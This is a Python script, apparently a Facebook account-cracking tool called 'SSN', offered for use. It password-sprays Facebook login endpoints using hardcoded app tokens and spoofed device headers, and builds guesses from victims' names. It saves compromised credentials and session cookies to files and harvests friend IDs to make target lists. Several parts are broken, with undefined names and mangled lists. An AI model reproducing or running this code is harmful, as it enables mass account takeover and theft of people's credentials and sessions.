logo =                                          """            
\033[1;37m    .d8888b.   .d8888b.   888b    888  
\033[1;37m   d88P  Y88b d88P  Y88b  8888b   888 
\033[1;37m    Y88b.      Y88b.      88888b  888
\033[1;37m    "Y888b.    "Y888b.    888Y88b 888  
\033[1;37m        "Y88b.     "Y88b. 888 Y88b888  
\033[1;37m          "888       "888 888  Y88888 
\033[1;37m    Y88b  d88P Y88b  d88P 888   Y8888
\033[1;37m     "Y8888P"   "Y8888P"  888    Y888
\033[1;37m------------------------------------------------
\033[1;37m Owner   :            Muhammad Suhbat
\033[1;37m Facebook:            Muhammad Suhbat
\033[1;37m Github  :            Suhbat-Ssn
\033[1;37m Version :            S1.3
\033[1;37m------------------------------------------------ """
def clear():
    os.system("clear")
    print(logo)    
    
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        print('\n')
        print(47*'-')
        print(' The Process has been Complete...')
        print(' TOTAL OK: %s' % str(len(oks)))
        print(' TOTAL CP: %s' % str(len(cps)))
        print(47*'-')
        input("Press enter to back SSN Menu ")
        exit()

def Suhbat():   
    os.system('clear')
    print(logo)
    print(f'[1] File Crack')
    print(f'[2] Public ID Crack')
    print(f'[3] Random Crack ')
    print(f'[4] Create File')
    print(f'[5] Login Tool')
    print(f'[6] Logout Cookie')
    print(f'[7] Remove Trash Files ')
    print(f'[8] Separate Ids')
    print(f'[9] Remove Duplicate IDs')
    print(f'[W] Join Whatsapp Group ')
    print(f'[F] Join Facebook Group ')
    print('')
    select = input('Select Menu>: ')
    if select =='1':
        method_crack()
    elif select =='2':
        exit(' This is Option Soon available ... ')
    elif select =='3':
        random_number()
    elif select =='4':
       menu()
    elif select =='5':
       login()
    elif select =='6':
       remove_Tc()
    elif select =='7':
       removef()
    elif select =='8':
       sids()
    elif select =='9':
       cutter()
    elif select =='W':
        os.system('xdg-open https://chat.whatsapp.com/J3gpK8NYNQBHhEYnVxN4X7')
        pass
    elif select =='F':
        os.system('xdg-open https://facebook.com/groups/3017062245271082/')
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        SSN(allkey)
        
def method_crack():
    global methods
    clear()
    print(f'[1] Method {1}')
    print(f'[2] Method {2}')
    print(f'[3] Method {3}')
    #print(f'[4] Method {4}')
    print(f'[0] Back')
    print('')
    option = input('Select method>: ')
    if option =='1':
        methods.append('methodA')
        main_crack().crack(id)
    elif option =='2':
        methods.append('methodB')
        main_crack().crack(id)
    elif option =='3':
        methods.append('methodC')
        main_crack().crack(id)
   # elif option =='4':
    #    methods.append('methodD')
   #     main_crack().crack(id)
    elif option =='0':
        Suhbat()
    else:
      print('\n Select Valid Option ...')
      time.sleep(2)
      method_crack()

class main_crack():
    def __init__(self):
        self.id=[]
    def crack(self,id):
        global methods
        clear()
        self.file = input('Put File Name : ')
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            print('Opps File Not Found ...')
            time.sleep(2)
            os.system('clear')
            print(logo)
            print('Try Again ...')
            time.sleep(2)
            main_crack().crack(id)
            
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[SSN] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": sid,
"password": ps,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 5; ARE-L22HN Build/QP1A.521094.694) [FBAN/FB4A;FBAV/356.0.0.28.112;FBBV/353870778;FBDM/{density=3.0,width=1080,height=2132};FBLC/en_US;FBRV/354800271;FBCR/NTT DOCOMO;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1983;FBSV/9;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': '22739', 'X-FB-SIM-HNI': '35221', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);SSNb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SSNb};{ckkk}"
                    print(f"\r{R} [SSN-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SSN_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSN_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [SSN-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/SSN_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodA(sid, name, ps)
            
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[SSN] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": sid,
"password": ps,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 5; ARE-L22HN Build/QP1A.521094.694) [FBAN/FB4A;FBAV/356.0.0.28.112;FBBV/353870778;FBDM/{density=3.0,width=1080,height=2132};FBLC/en_US;FBRV/354800271;FBCR/NTT DOCOMO;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1983;FBSV/9;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': '22739', 'X-FB-SIM-HNI': '35221', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);SSNb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SSNb};{ckkk}"
                    print(f"\r{R} [SSN-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SSN_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSN_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [SSN-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/SSN_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodC(sid, name, ps)
            
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[SSN] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": sid,
"password": ps,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 5; ARE-L22HN Build/QP1A.521094.694) [FBAN/FB4A;FBAV/356.0.0.28.112;FBBV/353870778;FBDM/{density=3.0,width=1080,height=2132};FBLC/en_US;FBRV/354800271;FBCR/NTT DOCOMO;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1983;FBSV/9;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': '22739', 'X-FB-SIM-HNI': '35221', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);SSNb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SSNb};{ckkk}"
                    print(f"\r{R} [SSN-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SSN_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSN_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [SSN-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/SSN_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodB(sid, name, ps)

    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[SSN] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        except:
            ls = fs
        try:
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                session=requests.Session()
                ua = random.choice (["Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.2 Chrome/44.0.2403.133 Mobile Safari/537.36"
 "Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G532M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36)",
 "Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G532M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36"
 "Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
 "Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36]"
 "Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A715F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36)"
 "Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G532G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36",
 "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-J200G Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.5 Chrome/38.0.2125.102 Mobile Safari/537.36]"
 "Mozilla/5.0 (Linux; Android 8.1.0; SAMSUNG SM-G610M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36]"
 "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36;]"
 "Mozilla/5.0 (Linux; Android 8.1.0; SAMSUNG SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36;]"
 "Mozilla/5.0 (Linux; Android 8.1.0; SAMSUNG SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36"
 "Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-G570M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36;]"
 "Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G532MT) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36)"
 "Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A205G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36;]"
 "Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-J700M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36]"
 "Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-N950F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36]"
 "Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36;]"
 "Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A217F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/11.0 Chrome/75.0.3770.143 Mobile Safari/537.36"
 "Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
 "Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A105M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
 "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36"
 "Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-J500M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
 "Mozilla/5.0 (Linux; Android 11; SM-A105FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/397.0.0.23.404;]"
 "Mozilla/5.0 (Linux; Android 13; SM-S906B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36"
 "Mozilla/5.0 (Linux; Android 12; LE2121) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36"
 "Mozilla/5.0 (Linux; Android 11; Redmi Note 9S Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 Instagram 263.2.0.19.104 Android (30/11; 440dpi; 1080x2168; Xiaomi/Redmi; Redmi Note 9S; curtana; qcom; it_IT; 428413139)"
 "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 265.0.0.13.302 (iPhone13,3; iOS 16_1_1; it_IT; it-IT; scale=3.00; 1170x2532; 435784589)"
 "Mozilla/5.0 (Linux; Android 11; CPH1941 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/397.0.0.23.404;]"
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 [ip:188.218.211.54]"
 "Mozilla/5.0 (Linux; Android 12; SM-A037G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 Instagram 264.0.0.22.106 Android (31/12; 320dpi; 720x1459; samsung; SM-A037G; a03s; mt6765; it_IT; 430370701)"
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36 Herring/91.1.5770.71"
 "Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36"
 "Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36"
 "Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36"
 "Mozilla/5.0 (Linux; Android 9; SM-G973U Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"
 "Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36"
 "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36"
 "Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"
 "Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36"
 "Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36"
 "Mozilla/5.0 (Linux; Android 5.1.1; SM-G928X Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36"
 "Mozilla/5.0 (Linux; Android 7.1.1; Google Pixel Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/54.0.2840.85 Mobile Safari/537.36"
 "Mozilla/5.0 (Linux; Android 9; J8110 Build/55.0.A.0.552; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36"
 "Mozilla/5.0 (Linux; Android 10; HTC Desire 21 pro 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36"
 "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1"
 "Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1"
 "Mozilla/5.0 (iPhone12,1; U; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1"
 "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254"
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
 "Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36"
 "Mozilla/5.0 (CrKey armv7l 1.5.16041) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.0 Safari/537.36"
 "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0"
 "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0"
 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"])  
                getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={sid}&flow=login_no_pin&refsrc=deprecated&_rdr')
                idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":sid,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":ps,}
                session.headers = {}
                headers= {"authority": 'mbasic.facebook.com',
                'method': 'GET',
                'scheme': 'https',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                'sec-ch-prefers-color-scheme': 'light',
                'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
                'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-ua-platform-version': '"11.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': pro,}
                complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False)
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [SSN-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SSN_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    #print(f"\r{A} [SSN-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/SSN_CP.txt','a').write(sid+'|'+ps+'\n')
                    break
                else:
                    continue
                #time.sleep(31)
            
            loop+=1
        except requests.exceptions.ConnectionError:
             self.methodD(sid, name, ps)
            
    def pasw(self):       
            pw = []
            clear()
            print('Put limit between 1 to 30')
            sl = int(input('How many password do you want to add?: '))
            os.system("clear")
            print(logo)
            print(f'{S} [Example: first123,last1122,firstlast,last,ETC]')
            print('')
            if sl =='':
                print('\n Put limit between 1 to 30')
            elif sl > 20:
                print('\nPassword limit Should Not Be Greater Than 30')
            else:
                for sr in range(sl):
                    pw.append(input(f'Password {sr+1}: '))
            os.system("clear")
            print(logo)
            
            print(f"\r{A}Use flight (airplane) mode before use {S}")
            print(47*"-")
            print(f'{S} Total IDs : %s ' % len(self.id))
            print(f'{S} Cracking Started...')
            print(47*"-")
            with SuhbatSSN(max_workers=30) as SSNworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                       else:
                            pwx =  pw
                            if 'methodA' in methods:
                                SSNworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                SSNworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                SSNworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                SSNworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
            

def remove_Tc():
        os.system('rm -rf .token.txt .cookie.txt');print(f'\n{F}Logout Successfully ...')
        login()
        
def login():
    clear()
    print('\x1b[00m\tLogin Using Cookies') 
    try:
        fbcokis= input('\n\x1b[00mPut Cookies:\x1b[92m')
        fact = requests.get("https://adsmanager.facebook.com/adsmanager/", cookies = {"cookie":fbcokis},headers=head).text
        act = re.search("act=(.*?)&nav_source",str(fact)).group(1)
        ftoken = requests.get(f"https://adsmanager.facebook.com/adsmanager/manage/campaigns?act={act}&nav_source=no_referrer", cookies = {"cookie":fbcokis}).text
        eaab = re.search('accessToken="(.*?)"',str(ftoken)).group(1)
        open(".tokn.txt", "w").write(eaab)
        open(".cokis.txt", "w").write(fbcokis)
        token = open('.tokn.txt','r').read()
        info = requests.get('https://graph.facebook.com/me/?access_token='+token,cookies = {"cookie":fbcokis}).json()
        print(f"{R}Login Successfully")
        menu()
    except Exception as error: 
        os.system("rm -f .tokn.txt")
        print("\x1b[1;91m\n\t\t[!] Cookies Expired ")
        slp(2)
        login()

def public():
    fbidz = []
    clear()
    print(logo)
    global totaldmp,count,srange 
    try:
        fbcokis = open(".cokis.txt", "r").read()
        token = open('.tokn.txt','r').read()
    except FileNotFoundError:
        print(f"{A}Cookie Expired ")
        slp(1)
        cmd('rm -rf .token.txt .cokis.txt')
        login()
    try:
        clear()
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        for rept in range(srange):
            rept += 1
            fbuid = input("[" + str(rept) + "] Put id username: ")
            clear()
            if  fbuid=='stop':
                break
                ys.close()
            try:
                dmp = requests.get("https://graph.facebook.com/"+fbuid+"/friends?limit=5000&access_token="+token,cookies = {"cookie":fbcokis}).json()
                for idnm in dmp['friends']['data']:
                    totaldmp+=1
                    fbidz.append(idnm['id'])
            except KeyError:
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/SSN.txt') 
